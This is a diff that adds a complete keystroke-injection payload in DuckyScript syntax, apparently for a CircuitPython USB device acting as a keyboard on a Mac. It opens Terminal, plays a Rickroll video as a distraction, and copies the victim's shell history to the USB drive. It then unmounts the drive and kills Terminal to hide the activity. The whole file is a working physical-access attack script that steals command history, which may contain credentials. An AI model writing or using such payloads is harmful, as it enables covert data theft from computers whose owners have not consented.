@@ -1,0 +1,20 @@
+DELAY 100
+GUI SPACE
+DELAY 10
+STRING terminal
+DELAY 100
+ENTER
+DELAY 150
+STRING open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+ENTER
+DELAY 1000
+GUI TAB
+DELAY 100
+STRING osascript -e 'set volume 1' && history > /Volumes/CIRCUITPY/temp/history.txt && diskutil info "CIRCUITPY" |grep -Eo "/dev/disk[0-9]s[0-9]" |pbcopy && diskutil unmount `pbpaste` && killall Terminal
+ENTER
+DELAY 100
+GUI TAB
+DELAY 100
+SPACE
+DELAY 10
+STRING f
